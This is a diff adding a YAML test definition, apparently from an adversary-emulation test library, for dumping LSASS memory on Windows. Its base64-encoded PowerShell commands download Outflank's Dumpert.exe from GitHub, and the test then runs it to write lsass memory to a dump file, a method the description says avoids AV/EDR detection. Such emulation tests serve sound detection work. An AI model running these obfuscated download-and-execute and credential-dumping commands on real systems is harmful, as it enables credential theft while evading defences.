@@ -1,0 +1,18 @@
+- id: 376b71bd-b76d-5236-9e5f-badac9608f11
+  name: Soumaia ART Tests - Dump LSASS.exe Memory using direct system calls and API unhooking
+  description: "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first. (requires elevation)"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABPAHUAdABmAGwAYQBuAGsALQBEAHUAbQBwAGUAcgB0AC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAFMAcABsAGkAdAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwATwB1AHQAZgBsAGEAbgBrAC0ARAB1AG0AcABlAHIAdAAuAGUAeABlACIAKQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBjAGwAcgAyAG8AZgA4AC8ARAB1AG0AcABlAHIAdAAvAHIAYQB3AC8ANQA4ADMAOABjADMANQA3ADIAMgA0AGMAYwA5AGIAYwA2ADkANgAxADgAYwA4ADAAYwAyAGIANQBiADIAZAAxADcAYQAzADkANABiADEAMAAvAEQAdQBtAHAAZQByAHQALwB4ADYANAAvAFIAZQBsAGUAYQBzAGUALwBPAHUAdABmAGwAYQBuAGsALQBEAHUAbQBwAGUAcgB0AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABPAHUAdABmAGwAYQBuAGsALQBEAHUAbQBwAGUAcgB0AC4AZQB4AGUAIgAKAA==
+          )
+          "%TEMP%\ART-ExternalPayloads\Outflank-Dumpert.exe"
+        cleanup: |-
+          del C:\windows\temp\dumpert.dmp >nul 2> nul
